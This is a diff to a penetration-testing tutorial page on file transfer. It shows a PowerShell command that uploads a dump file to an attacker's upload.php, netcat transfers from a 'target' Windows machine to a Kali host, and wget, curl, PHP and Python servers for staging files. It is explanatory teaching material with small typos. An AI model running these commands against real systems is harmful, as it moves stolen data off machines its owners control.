@@ -203,6 +203,95 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
 
 ### This is how to use it
 
+{% code overflow="wrap" %}
 ```bash
-powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.1.10/upload.php', 'pass.txt')
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.9.0.213/upload.php', 'iexplore.DMP')
 ```
+{% endcode %}
+
+## Different methods to setup the server for file transfer
+
+To perform the file transfer we need to setup a server, besides using **updog**.
+
+```bash
+updog -p 80
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd2qv5ieUJMsgL9sQva7HMIKCmJOZAhUhZODAit2mcxSZ2hfMnpbfm0dS3kphUB4lzRsN_ESov2ZP-y-1X0rR6LzNMzQbLx-P9qUfG8Js7SA7xUtjhAlgC1p7GPYSiVhGFXSJX0WADOIJuP_NWLL816B5cb22CHXbY7MkZC-sOS4DsP5-7-GU8rLDO3BtL/s16000/2.png" alt=""><figcaption></figcaption></figure>
+
+### wget
+
+We can use the wget command to transfer the file. **wget** is a powerful command to download files from the web. It should be noted that while doing file transfer using wget in windows, we need to mention the **-o** (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., **WebResponseObject**. The command for wget in windows is:
+
+```
+powershell wget http://192.168.1.8/ignite.txt -o ignite.txt -o ignite.txt
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFWdBQltBaUJTAtCOYfcBy_fCcC9edORpF2Z1TFZI-Gq_GunT8sy2utnIKca9YP-67ZV49XpjvodU84TXZoJaJSD3vfS0FWAp_VYNnqAjFKOWIlAKn02HDaKVzBAVSgA-tLCmoPRnh1aewVoxpcZ98VezBj0j_w49dhO-xiM43PCF9bdf_BwFLrmgky1A1/s16000/3.png" alt=""><figcaption></figcaption></figure>
+
+### curl
+
+Curl is a powerful command-line tool, which can be used to transfer files using various networking protocols. Following will be the command to transfer the file:
+
+```bash
+curl http://192.168.31.141/ignite.txt -o ignite.txt
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkMNrZZDFuJvd25DW03_tRiVd9TBl-r3yJoYJgWDpvzj9YRA7t6yzzydRZRW4HzxaMMfIDhaN4u8JXJuIXax0xLXGg5rUK_38D3L2p1LtVD_2Q-BOm9b7voyQsXk9_LfHVRmHuYwXLrd7dPwKziZcl7BDNQYZzBaSJDhcztpweGpGcaATXUxbrSGS_B_IU/s16000/4.png" alt=""><figcaption></figcaption></figure>
+
+### To setup a server using **PHP**, we can use the following command:
+
+```php
+php -S 0.0.0.0:8081
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYvOOQLroJSIp_FgLy3uqgkQrInCQen8HhqInkolTxekU9LJCcahHk2KrYu2W0FUbsv47E9JI9rkFiJFzkCdmjzO1iKmTwaqKe-FtpAnaJrw2ZGkJwFNAFsuduyFeauo3aSZdqEQXoaJ0b0fgOj7grP5gbjfTsayFZNmqK_5dAOtWVCxIfSta8Z0VLztFw/s16000/60.png" alt=""><figcaption></figcaption></figure>
+
+### To setup a server using **python2**, we can use the following command:
+
+```python
+python2 -m SimpleHTTPServer 80
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2gB0EhRBZRyJOng926oniYXXgZL1M2yHZJxrEcsSGx5UiPryr2-XAH7SzuVCmccq87hp907Gt6BW0b1Zu2onHl_Ty56QRpVBWjjLfUiUmYxkbJJDV1pFL_HZNk382_iXpaVhVgN2Zaq_zy9sKifwWGqFVgKb6c_b-Vl9I2R4b5J1bEMx6rvzB9-hyR4O-/s16000/61.png" alt=""><figcaption></figcaption></figure>
+
+### To setup a server using **python3**, we can use the following command:
+
+```python
+python3 -m http.server 8000
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4y_VnJALVGhKZF5ak3RAxEoUFGt6cLlpX0R6ttoBy4_oZMaKtfOxaJp-1w9BWs1E6WG-HlTSWc5LnnjHV83_WVxsjkZreUDTdCuH2U56G0DhNiNGk2wqDyn438HoyktAlRb27zQTx69S48BCVqfRxqE4qnZlf2ExPpoLv9WscpnTwWzjANyCnoG7cteU1/s16000/62.png" alt=""><figcaption></figcaption></figure>
+
+### File transfer using Netcat
+
+Netcat, commonly known as **nc**, is a multifunctional networking tool designed for reading from and writing to network connections over TCP or UDP. Netcat can facilitate file transfers by establishing a simple client-server setup.
+
+To transfer file in the kali machine from an Ubuntu machine we can use the following command inside kali:
+
+```bash
+nc -lvp 5555 > file.txt
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrEYjOpTYbrtwgv7KVe5eMJ4Qfk8ICdPJzQUlltKO2lkzgG2nAp4N1FZaioOdSCH3vkogEai1mKOhGqeAKN9D65RWIwLxRF27OLTZ2ZpFaE0fv3Vp3Jmh7dVCwE1_eZor0hrushOEBhxE5yYY1_8SDEuwTt_DYVGnSiUA3u6nScy3tK2N8p3DCeP4U8kPg/s16000/71.png" alt=""><figcaption></figcaption></figure>
+
+Now wSimilarly, we can also receive files from a windows machine inside our kali linux. However, it should be noted that we the target windows machine should have the nc.exe binary to make this method work.
+
+Following is the command we need to run on the windows machine:
+
+```powershell
+nc.exe 192.168.31.141 5555 < data.txt
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjzVyTrgfr4esOxQDfaVhP7QtyuCcWj5tYPG3Bzj646H8As3qIf8g1AtjvSUiRE07UvoqM9ojR5OaojlFI_0q5rXncAIuegubNwzzLICrpZI__EMQC973mahtaL7V0PUJ_JUhVdXCP7j9rSWIslfBnnoAjS40GRc2dVxEkEIdngrx3o8ag2rnfG313o8e/s16000/73.png" alt=""><figcaption></figcaption></figure>
+
+To receive the file in the kali machine, we will run the following command:
+
+```bash
+nc -lvp 5555 > data.txt
+cat data.txt
+```
+
+<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6LU-K471evwFOeojlIiC0uJE84Wz0_3Z1oJcKP8h59pDfqQ2CEmpoj79KEs9G4Vxf-UhR4OR3SumX-nPUwbaBARiN6bLC520x8IOMnOuHFAbLe52HQTI0jFIkost4qII280ajayN66Dse9KTpjUTy_LzzhnYnvsMzxzFUuDokAG5O3bYQRegrQ2C_Uskw/s16000/74.png" alt=""><figcaption></figcaption></figure>
+
+\
